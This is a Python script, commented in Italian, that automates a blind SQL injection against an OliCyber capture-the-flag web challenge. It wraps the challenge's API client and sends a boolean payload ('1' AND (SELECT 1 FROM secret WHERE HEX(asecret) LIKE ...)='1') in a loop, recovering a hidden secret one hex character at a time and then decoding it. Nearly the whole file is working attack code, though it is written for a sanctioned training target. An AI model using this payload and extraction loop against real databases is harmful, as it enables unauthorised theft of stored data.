#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
blind_enum_olicyber.py

Enumera HEX(asecret) dalla challenge blind-SQLi usando la classe Inj fornita.
Adattalo se la challenge cambia formato di risposta.

Esempio:
    python3 blind_enum_olicyber.py --host "http://web-17.challs.olicyber.it" --delay 0.12 --verbose

Attenzione: usa questo script solo su targets autorizzati (CTF).
"""

import argparse
import time
import binascii
import sys
import json
from typing import Tuple

# ---------------------------------------------------------------------
# Inserisci qui la libreria fornita (la tua challenge ha fornito esattamente questa classe)
# ---------------------------------------------------------------------
import requests

class Inj:
    def __init__(self, host):
        self.sess = requests.Session() # Start the session. We want to save the cookies
        self.base_url = '{}/api/'.format(host.rstrip('/'))
        self._refresh_csrf_token() # Refresh the ANTI-CSRF token

    def _refresh_csrf_token(self):
        resp = self.sess.get(self.base_url + 'get_token')
        resp = resp.json()
        self.token = resp['token']

    def _do_raw_req(self, url, query):
        headers = {'X-CSRFToken': self.token}
        data = {'query': query }
        return self.sess.post(url,json=data, headers=headers).json()

    def logic(self, query):
        url = self.base_url + 'logic'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def union(self, query):
        url = self.base_url + 'union'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def blind(self, query):
        url = self.base_url + 'blind'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def time(self, query):
        url = self.base_url + 'time'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

# ---------------------------------------------------------------------
# Fine classe Inj
# ---------------------------------------------------------------------

# Utility per interpretare il campo 'result' ritornato da Inj.blind()
def is_positive_result(resp) -> bool:
    """
    La API potrebbe restituire booleano, numeri, o stringhe come 'Success' o 'true'.
    Convertiamo in stringa e verifichiamo alcuni casi comuni.
    """
    if resp is None:
        return False
    # se è booleano True
    if isinstance(resp, bool):
        return resp
    # se è un numero non-zero
    if isinstance(resp, (int, float)):
        return resp != 0
    # altrimenti confrontiamo la rappresentazione testuale
    s = str(resp).strip().lower()
    return s in ('1', 'true', 'success', 'ok', 'yes')

def safe_blind(inj: Inj, query: str, max_retries: int = 3, backoff: float = 1.0) -> Tuple[bool, str]:
    """
    Chiamata wrapper a inj.blind che tenta alcuni retry sicuri in caso di errori.
    Ritorna (matched_bool, sql_error_or_response_text)
    """
    for attempt in range(1, max_retries+1):
        try:
            resp, err = inj.blind(query)
            matched = is_positive_result(resp)
            return matched, json.dumps({'resp': resp, 'sql_error': err})
        except requests.RequestException as e:
            wait = backoff * attempt
            print(f"[!] Network error on attempt {attempt}/{max_retries}: {e}. Attendo {wait}s e riprovo...", file=sys.stderr)
            time.sleep(wait)
        except Exception as e:
            # Qualunque altro errore: log e retry
            print(f"[!] Errore imprevisto: {e}. Tentativo {attempt}/{max_retries}", file=sys.stderr)
            time.sleep(backoff * attempt)
    return False, 'network-failure-or-exception'

def main():
    parser = argparse.ArgumentParser(description='Blind-SQLi HEX enumerator (olicyber Inj class)')
    parser.add_argument('--host', required=True, help='Host base es: http://web-17.challs.olicyber.it')
    parser.add_argument('--dictionary', default='0123456789abcdef', help='Caratteri da provare (default 0123456789abcdef)')
    parser.add_argument('--delay', type=float, default=0.1, help='Delay tra richieste (default 0.1s)')
    parser.add_argument('--max-len', type=int, default=512, help='Lunghezza massima hex da cercare (default 512)')
    parser.add_argument('--verbose', action='store_true', help='Stampa output dettagliato delle chiamate')
    parser.add_argument('--max-retries', type=int, default=3, help='Retry in caso di errore di rete (default 3)')
    args = parser.parse_args()

    # Istanzia la classe Inj (effettuerà la richiesta per get_token)
    print(f"[*] Connetto a {args.host} ...")
    inj = Inj(args.host)

    dictionary = args.dictionary.lower()
    result = ''

    # Payload conforme all'enunciato
    payload_template = "1' AND (SELECT 1 FROM secret WHERE HEX(asecret) LIKE '{}%')='1"

    print("[*] Avvio enumerazione blind-SQLi (HEX). Premere CTRL-C per interrompere.")
    print(f"[*] Dizionario: {dictionary}  delay: {args.delay}s  max-len: {args.max_len}")

    try:
        while True:
            if len(result) >= args.max_len:
                print(f"[!] Raggiunta lunghezza massima ({args.max_len}). Termino.")
                break

            found_in_position = False
            for c in dictionary:
                guess = result + c
                payload = payload_template.format(guess)
                if args.verbose:
                    print(f"[v] Provo: {guess} -> payload: {payload}")

                matched, info = safe_blind(inj, payload, max_retries=args.max_retries)
                if args.verbose:
                    print(f"[v] Response info: {info}")

                if matched:
                    result += c
                    print(f"[+] Trovato: '{c}'  -> current HEX: {result}")
                    found_in_position = True
                    break

                # piccolo ritardo per non sovraccaricare il server
                time.sleep(args.delay)

            if not found_in_position:
                # Nessun char del dizionario ha funzionato: presumiamo fine stringa
                print("[*] Nessun carattere trovato per la posizione corrente: terminazione dell'enumerazione.")
                break

    except KeyboardInterrupt:
        print("\n[!] Interrotto dall'utente (CTRL-C). Procedo con ciò che ho trovato...")

    print("----------------------------------------------------------------")
    if result:
        print(f"[+] HEX trovata: {result}")
        # Proviamo a decodificare in ASCII/UTF-8
        try:
            raw = binascii.unhexlify(result)
            decoded = raw.decode('utf-8', errors='replace')
            print(f"[+] Decodifica UTF-8: {decoded}")
        except (binascii.Error, ValueError) as e:
            print(f"[!] Impossibile decodificare la hex: {e}")
    else:
        print("[!] Nessun risultato trovato.")

if __name__ == '__main__':
    main()
